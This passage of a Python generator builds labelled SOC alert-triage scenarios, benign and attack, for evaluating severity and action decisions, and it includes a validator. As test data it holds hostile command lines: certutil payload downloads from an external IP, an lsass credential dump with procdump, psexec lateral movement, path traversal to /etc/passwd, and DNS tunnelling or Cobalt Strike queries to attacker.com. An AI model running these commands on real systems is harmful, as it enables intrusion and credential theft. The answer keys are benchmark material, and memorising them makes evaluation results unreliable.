       "PsExec bởi DOMAIN\\admin — script quản trị (FP ghi trong rule B22). "
       "Rule gán medium; tình huống thực tế low/no_action."),

    scenario("v2-031", "Admin tạo schtasks định kỳ", [
        b19_schtasks("v2-031:e1", T(33),
                     cmdline="schtasks.exe /create /tn AdminTask /tr C:\\Scripts\\task.bat /sc daily /st 02:00",
                     user="DOMAIN\\admin"),
    ], False, "low", ["T1053.005"], "no_action",
       "schtasks bởi admin — quản trị định kỳ. Rule B19 low; đáp án khớp mức luật."),

    scenario("v2-032", "Backup service tạo scheduled task ban đêm", [
        b19_schtasks("v2-032:e1", T(34),
                     cmdline="schtasks.exe /create /tn BackupNightly /tr C:\\Scripts\\backup.bat /sc daily /st 02:00",
                     user="DOMAIN\\backup"),
    ], False, "low", ["T1053.005"], "no_action",
       "DOMAIN\\backup — tạo nightly task là hoạt động bình thường (inventory). "
       "Rule B19 đã là low; đáp án khớp mức luật — ca Splunk ĐÚNG, dùng làm baseline."),

    scenario("v2-033", "Admin reg add Run key", [
        b21_reg_run("v2-033:e1", T(35), user="DOMAIN\\admin"),
    ], False, "low", ["T1547.001"], "no_action",
       "Admin thêm Run key — quản trị. Rule B21 gán medium; tình huống thực tế low/no_action."),

    scenario("v2-034", "Admin chạy PowerShell Invoke-WebRequest", [
        b11_web_request("v2-034:e1", T(36),
                        cmdline="powershell.exe Invoke-WebRequest -Uri https://update.microsoft.com",
                        user="DOMAIN\\admin"),
    ], False, "low", ["T1059.001"], "no_action",
       "Admin dùng PS web request để update — rule B11 medium; tình huống thực tế low/no_action."),

    scenario("v2-035", "Backup chạy certutil download", [
        b12_certutil_download("v2-035:e1", T(37),
                              cmdline="certutil.exe -urlcache -split -f http://internal-backup.local/pkg.zip C:\\temp\\pkg.zip"),
    ], False, "low", ["T1027", "T1105"], "no_action",
       "certutil trong ngữ cảnh backup nội bộ — rule B12 medium; tình huống thực tế low/no_action."),

    scenario("v2-036", "Loop scan từ context quét định kỳ", [
        b18_scan_loop("v2-036:e1", T(38),
                      cmdline="for i in 1 2 3 4 5; do ping 192.168.56.$i; done"),
    ], False, "low", ["T1059", "T1018"], "no_action",
       "Loop scan từ máy admin — rule B18 medium; tình huống thực tế low/no_action."),

    scenario("v2-037", "Admin chạy whoami /priv 2 lần cách 30s", [
        b16_whoami_priv("v2-037:e1", T(39), user="DOMAIN\\admin"),
        b16_whoami_priv("v2-037:e2", "2026-09-27T01:39:30Z", user="DOMAIN\\admin"),
    ], False, "low", ["T1033"], "no_action",
       "Admin chạy whoami 2 lần cách 30s — vẫn là hành vi admin. Rule B16 high; thực tế low/no_action."),

    scenario("v2-038", "Backup chạy B21 reg add Run key", [
        b21_reg_run("v2-038:e1", T(40),
                    cmdline='reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backup /d C:\\Scripts\\backup.bat',
                    user="DOMAIN\\backup"),
    ], False, "low", ["T1547.001"], "no_action",
       "Backup thêm Run key cho script riêng — rule B21 medium; tình huống thực tế low/no_action."),

    scenario("v2-039", "LB monitor Suricata scan từ 192.168.56.5", [
        c03_suricata_scan("v2-039:n1", T(41), src="192.168.56.5", dport=9100),
        c03_suricata_scan("v2-039:n2", T(42), src="192.168.56.5", dport=9200),
    ], False, "low", ["T1046", "T1595"], "no_action",
       "LB monitor kiểm tra port 9100/9200 (node-exporter) — hợp lệ. Rule C03 medium; thực tế low/no_action."),

    scenario("v2-040", "IT scanner B02 path traversal do scanner nhầm", [
        b02_path_traversal("v2-040:w1", T(43), src="192.168.56.30",
                           uri="../../../etc/passwd"),
    ], False, "low", ["T1190"], "no_action",
       "Scanner IT thử path traversal là 1 bước scan định kỳ (FP ghi trong B02). "
       "Rule gán medium; tình huống thực tế low/no_action."),

    scenario("v2-061", "Backup định kỳ đẩy 60 MB ra external storage", [
        c01_large_outbound("v2-061:n1", T(44), src="192.168.56.20",
                           dst="203.0.113.50", bytes_out=62000000),
    ], False, "low", ["T1041", "T1048"], "no_action",
       "Backup job đẩy 60 MB ra external. Khớp C01 (FP ghi trong rule: "
       "'Backups or software updates pushed to external storage'). "
       "Rule C01 medium; tình huống thực tế low/no_action."),

    scenario("v2-062", "Update phần mềm đẩy dữ liệu lớn (báo nhầm)", [
        c01_large_outbound("v2-062:n1", T(45), src="192.168.56.20",
                           dst="203.0.113.60", bytes_out=85000000),
    ], False, "low", ["T1041", "T1048"], "no_action",
       "Software update server đẩy 85 MB ra external. Cũng là FP ghi trong C01. "
       "Rule gán medium; tình huống thực tế low/no_action."),
]


# ==================== NHÓM 3 — SPLUNK GÁN THẤP (nhiều alert liên tiếp) ====================

SCENARIOS += [
    scenario("v2-041", "5 whoami /priv liên tiếp trong 2 phút", [
        b16_whoami_priv("v2-041:e1", T(44)),
        b16_whoami_priv("v2-041:e2", "2026-09-27T01:44:30Z"),
        b16_whoami_priv("v2-041:e3", "2026-09-27T01:45:00Z"),
        b16_whoami_priv("v2-041:e4", "2026-09-27T01:45:30Z"),
        b16_whoami_priv("v2-041:e5", "2026-09-27T01:46:00Z"),
    ], True, "critical", ["T1033"], "block",
       "5 lần whoami /priv từ IIS APPPOOL trong 2 phút — trinh sát chủ động. "
       "Rule B16 chỉ gán high cho 1 alert; chuỗi lặp = critical."),

    scenario("v2-042", "3 certutil download liên tiếp", [
        b12_certutil_download("v2-042:e1", T(47),
                              cmdline="certutil.exe -urlcache -split -f http://203.0.113.45/a.exe C:\\temp\\a.exe"),
        b12_certutil_download("v2-042:e2", "2026-09-27T01:47:30Z",
                              cmdline="certutil.exe -urlcache -split -f http://203.0.113.45/b.exe C:\\temp\\b.exe"),
        b12_certutil_download("v2-042:e3", "2026-09-27T01:48:00Z",
                              cmdline="certutil.exe -urlcache -split -f http://203.0.113.45/c.exe C:\\temp\\c.exe"),
    ], True, "high", ["T1027", "T1105"], "block",
       "3 lần tải file khác nhau từ cùng IP trong 1 phút — staging. "
       "Rule B12 medium; hành vi lặp + staging → high."),

    scenario("v2-043", "Chuỗi schtasks + PS encoded + Run key", [
        b19_schtasks("v2-043:e1", T(49)),
        b08_ps_encoded("v2-043:e2", "2026-09-27T01:49:30Z"),
        b21_reg_run("v2-043:e3", "2026-09-27T01:50:00Z"),
    ], True, "critical", ["T1053.005", "T1059.001", "T1547.001"], "block",
       "3 kỹ thuật persistence liên tiếp trong 1 phút — kẻ tấn công đang cài chân. "
       "Mỗi rule đơn lẻ low/medium; chuỗi = critical."),

    scenario("v2-044", "Chuỗi systeminfo → whoami /priv → net user", [
        b17_systeminfo("v2-044:e1", T(51)),
        b16_whoami_priv("v2-044:e2", "2026-09-27T01:51:30Z"),
        b06_webshell_recon("v2-044:e3", "2026-09-27T01:52:00Z",
                           cmdline="net user /domain"),
    ], True, "critical", ["T1082", "T1033", "T1087"], "block",
       "Discovery liên tiếp: systeminfo (low) + whoami (high) + net user (high) "
       "từ cùng ngữ cảnh webshell. Chuỗi = critical."),

    scenario("v2-045", "3 alert DNS b64 trong 1 phút", [
        b23_dns_b64("v2-045:n1", T(53), query="cGF5bG9hZDE=.attacker.com"),
        b23_dns_b64("v2-045:n2", "2026-09-27T01:53:30Z", query="cGF5bG9hZDI=.attacker.com"),
        b23_dns_b64("v2-045:n3", "2026-09-27T01:54:00Z", query="cGF5bG9hZDM=.attacker.com"),
    ], True, "high", ["T1048.003", "T1071.004"], "block",
       "3 DNS query b64 khác nhau trong 1 phút — tunneling đang chạy. "
       "Rule B23 medium cho 1 alert; chuỗi lặp = high."),

    scenario("v2-046", "2 alert B05 liên tiếp (webshell tải 2 shell)", [
        b05_w3wp_spawn("v2-046:e1", T(55)),
        b05_w3wp_spawn("v2-046:e2", "2026-09-27T01:55:30Z",
                       cmdline="cmd.exe /c ipconfig"),
    ], True, "critical", ["T1505.003", "T1190"], "block",
       "w3wp sinh 2 lệnh khác nhau (whoami + ipconfig) trong 1 phút — webshell hoạt động. "
       "Rule B05 high cho 1; chuỗi = critical."),

    scenario("v2-047", "PowerShell encoded + download pattern", [
        b08_ps_encoded("v2-047:e1", T(56)),
        b10_ps_download("v2-047:e2", "2026-09-27T01:56:30Z"),
    ], True, "critical", ["T1059.001"], "block",
       "PS encoded + IEX DownloadString trong 1 phút — stager 2 giai đoạn. "
       "Mỗi rule high; chuỗi = critical."),

    scenario("v2-048", "3 LOLBAS khác nhau trong 1 phút", [
        b12_certutil_download("v2-048:e1", T(57)),
        b15_mshta("v2-048:e2", "2026-09-27T01:57:30Z"),
        b14_bitsadmin("v2-048:e3", "2026-09-27T01:58:00Z"),
    ], True, "critical", ["T1027", "T1105", "T1218.005", "T1197"], "block",
       "3 LOLBAS khác nhau tải/chạy file trong 1 phút — chaining. Chuỗi = critical."),

    scenario("v2-049", "Path traversal + SQLi cùng IP", [
        b02_path_traversal("v2-049:w1", T(59), src="203.0.113.99"),
        b01_sqli("v2-049:w2", "2026-09-27T01:59:30Z", src="203.0.113.99"),
    ], True, "high", ["T1190"], "block",
       "Path traversal (medium) + SQLi (high) cùng IP trong 1 phút — exploitation đa kỹ thuật. "
       "Rule B02 medium; chuỗi = high."),

    scenario("v2-050", "5 DNS query Cobalt Strike liên tiếp", [
        b25_cobalt_dns("v2-050:n1", T(58), query="aaa.stage.attacker.com"),
        b25_cobalt_dns("v2-050:n2", "2026-09-27T01:58:30Z", query="aaa.stage.attacker.com"),
        b25_cobalt_dns("v2-050:n3", "2026-09-27T01:59:00Z", query="post.1.attacker.com"),
        b25_cobalt_dns("v2-050:n4", "2026-09-27T01:59:30Z", query="aaa.stage.attacker.com"),
        b25_cobalt_dns("v2-050:n5", "2026-09-27T02:00:00Z", query="aaa.stage.attacker.com"),
    ], True, "critical", ["T1071.004"], "block",
       "5 DNS beacon Cobalt Strike trong 2 phút — kênh C2 đang hoạt động. "
       "Rule B25 đã critical; chuỗi củng cố critical."),
]


# ==================== NHÓM 4 — NHIỀU ALERT (kill-chain, tổng hợp) ====================

SCENARIOS += [
    scenario("v2-051", "Kill-chain đầy đủ: recon → SQLi → webshell → C2", [
        c03_suricata_scan("v2-051:n1", T(0), src="203.0.113.45"),
        c03_suricata_scan("v2-051:n2", T(1), src="203.0.113.45", dport=22),
        b01_sqli("v2-051:w1", T(2), src="203.0.113.45"),
        b03_webshell_url("v2-051:w2", T(3), src="203.0.113.45", uri="=whoami"),
        b05_w3wp_spawn("v2-051:e1", T(4)),
        c02_suricata_c2("v2-051:n3", T(5), src="192.168.56.20", dst="203.0.113.45"),
    ], True, "critical", ["T1046", "T1595", "T1190", "T1505.003", "T1071"], "block",
       "Chuỗi 6 alert từ recon → SQLi → webshell → RCE → C2. Kill-chain đầy đủ. "
       "Từng rule đơn lẻ high/medium; tổng = critical."),

    scenario("v2-052", "Webshell + discovery + persistence", [
        b05_w3wp_spawn("v2-052:e1", T(6)),
        b17_systeminfo("v2-052:e2", T(7)),
        b16_whoami_priv("v2-052:e3", T(8)),
        b19_schtasks("v2-052:e4", T(9)),
    ], True, "critical", ["T1505.003", "T1082", "T1033", "T1053.005"], "block",
       "Webshell → discovery → persistence. 4 alert trong 4 phút."),

    scenario("v2-053", "PowerShell stager chain", [
        b11_web_request("v2-053:e1", T(10)),
        b10_ps_download("v2-053:e2", T(11)),
        b09_ps_frombase64("v2-053:e3", T(12)),
    ], True, "critical", ["T1059.001", "T1027", "T1140"], "block",
       "PS web request → download → base64 decode. Stager 3 bước."),

    scenario("v2-054", "LOLBAS download chain", [
        b12_certutil_download("v2-054:e1", T(13)),
        b13_certutil_decode("v2-054:e2", T(14)),
        b15_mshta("v2-054:e3", T(15)),
    ], True, "critical", ["T1027", "T1105", "T1218.005"], "block",
       "certutil download → certutil decode → mshta exec. Chuỗi thực thi."),

    scenario("v2-055", "SQLi + upload webshell + RCE", [
        b01_sqli("v2-055:w1", T(16), src="203.0.113.77"),
        b03_webshell_url("v2-055:w2", T(17), src="203.0.113.77", uri="=whoami"),
        b05_w3wp_spawn("v2-055:e1", T(18)),
    ], True, "critical", ["T1190", "T1505.003"], "block",
       "SQLi → gọi webshell → RCE. Chuỗi exploitation web kinh điển."),

    scenario("v2-056", "DNS tunneling nhiều bước", [
        b23_dns_b64("v2-056:n1", T(19), query="cGF5bG9hZDE=.attacker.com"),
        b24_dns_txt("v2-056:n2", T(20), answer="IEX (New-Object Net.WebClient)"),
        b25_cobalt_dns("v2-056:n3", T(21), query="aaa.stage.attacker.com"),
    ], True, "critical", ["T1071.004", "T1048.003"], "block",
       "DNS b64 + TXT exec + Cobalt beacon. DNS là kênh chính."),

    scenario("v2-057", "Recon + lateral", [
        c03_suricata_scan("v2-057:n1", T(22), src="203.0.113.77"),
        b22_psexec("v2-057:e1", T(23),
                   cmdline="psexec.exe -accepteula \\\\192.168.56.50 cmd.exe",
                   user="IIS APPPOOL\\DefaultAppPool"),
    ], True, "high", ["T1046", "T1595", "T1569", "T1021"], "block",
       "Scan từ IP ngoài + PsExec tới host nội bộ bởi IIS APPPOOL. Recon + lateral."),

    scenario("v2-058", "Chuỗi hoàn chỉnh 8 bước", [
        c03_suricata_scan("v2-058:n1", T(0), src="203.0.113.45"),
        b01_sqli("v2-058:w1", T(1), src="203.0.113.45"),
        b03_webshell_url("v2-058:w2", T(2), src="203.0.113.45", uri="=whoami"),
        b05_w3wp_spawn("v2-058:e1", T(3)),
        b08_ps_encoded("v2-058:e2", T(4)),
        b09_ps_frombase64("v2-058:e3", T(5)),
        b21_reg_run("v2-058:e4", T(6)),
        c02_suricata_c2("v2-058:n2", T(7), src="192.168.56.20", dst="203.0.113.45"),
    ], True, "critical",
       ["T1046", "T1190", "T1505.003", "T1059.001", "T1027", "T1547.001", "T1071"], "block",
       "8 bước: recon → SQLi → webshell → RCE → PS encoded → decode → persistence → C2. "
       "Kill-chain đầy đủ theo MITRE ATT&CK."),

    scenario("v2-059", "Webshell + credential dump + C2", [
        b05_w3wp_spawn("v2-059:e1", T(8)),
        b07_webshell_hacking("v2-059:e2", T(9),
                             child="procdump.exe", cmdline="procdump.exe -ma lsass.exe lsass.dmp"),
        c02_suricata_c2("v2-059:n1", T(10), src="192.168.56.20", dst="203.0.113.45"),
    ], True, "critical", ["T1505.003", "T1018", "T1033", "T1087", "T1071"], "block",
       "Webshell → procdump lsass (credential dump) → exfil qua C2."),

    scenario("v2-060", "Ca lành tính hỗn hợp (baseline)", [
        c03_suricata_scan("v2-060:n1", T(11), src="192.168.56.30", dport=80),
        b19_schtasks("v2-060:e1", T(12),
                     cmdline="schtasks.exe /create /tn BackupNightly /tr C:\\Scripts\\backup.bat /sc daily /st 02:00",
                     user="DOMAIN\\backup"),
        b17_systeminfo("v2-060:e2", T(13), user="DOMAIN\\admin"),
        c03_suricata_scan("v2-060:n2", T(14), src="192.168.56.5", dport=9100),
    ], False, "low", [], "no_action",
       "4 alert hỗn hợp từ các nguồn hợp lệ (IT scanner + backup + admin + LB monitor) "
       "trong 4 phút. Từng alert riêng lẻ đã hợp lệ; tổng cũng vẫn lành → không hành động."),
]


# ============ Kiểm tra & ghi file ============

def validate():
    """Kiểm cấu trúc — phát hiện lỗi quy ước severity/action."""
    errors = []
    valid_actions = {"no_action", "review", "block"}
    valid_severity = {"low", "medium", "high", "critical"}

    for sc in SCENARIOS:
        gt = sc["ground_truth"]
        if gt["correct_action"] not in valid_actions:
            errors.append(f"{sc['id']}: correct_action lạ '{gt['correct_action']}'")
        if gt["severity"] not in valid_severity:
            errors.append(f"{sc['id']}: severity lạ '{gt['severity']}'")

        # Quy ước mức → action (nhưng cho phép attack low → review)
        s, a = gt["severity"], gt["correct_action"]
        is_attack = gt["is_attack"]

        if not is_attack:
            # Benign: mức low → no_action (chỉ lành tính)
            if s != "low" or a != "no_action":
                errors.append(
                    f"{sc['id']}: benign nhưng severity={s}, action={a} "
                    f"(nên low/no_action)")
        else:
            # Attack: theo mức
            expected = {"low": "review", "medium": "review",
                        "high": "block", "critical": "block"}[s]
            if a != expected:
                errors.append(
                    f"{sc['id']}: attack severity={s} nhưng action={a} "
                    f"(phải {expected})")

        # Kiểm alert_id + rule_name
        for al in sc["alerts"]:
            if not al["rule_name"] or not al["rule_level"]:
                errors.append(f"{sc['id']}/{al['alert_id']}: thiếu rule_name/level")

    return errors


def main():
    errs = validate()
    if errs:
        print("LỖI CẤU TRÚC:")
        for e in errs:
            print(f"  - {e}")
        raise SystemExit(1)

    OUT.write_text(json.dumps({"scenarios": SCENARIOS}, indent=2, ensure_ascii=False),
                   encoding="utf-8")

    # Thống kê thực tế
    n_total = len(SCENARIOS)
    n_siem_ok = sum(1 for s in SCENARIOS if s["ground_truth"]["siem_correct"])
    n_siem_bad = n_total - n_siem_ok
    n_multi = sum(1 for s in SCENARIOS if len(s["alerts"]) > 1)
    n_attack = sum(1 for s in SCENARIOS if s["ground_truth"]["is_attack"])
    n_benign = n_total - n_attack

    print(f"Đã ghi {n_total} scenario vào {OUT}")
    print(f"  Attack          : {n_attack}")
    print(f"  Benign          : {n_benign}")
    print(f"  siem_correct    : true={n_siem_ok}, false={n_siem_bad}")
    print(f"  nhiều alert     : {n_multi}")
    c_sev = Counter(s["ground_truth"]["severity"] for s in SCENARIOS)
    c_act = Counter(s["ground_truth"]["correct_action"] for s in SCENARIOS)
    c_grp = Counter(s["alerts"][0]["surface"] for s in SCENARIOS if s["alerts"])
    print(f"  mức             : {dict(c_sev)}")
    print(f"  action          : {dict(c_act)}")
    print(f"  surface (alert đầu): {dict(c_grp)}")


if __name__ == "__main__":
    main()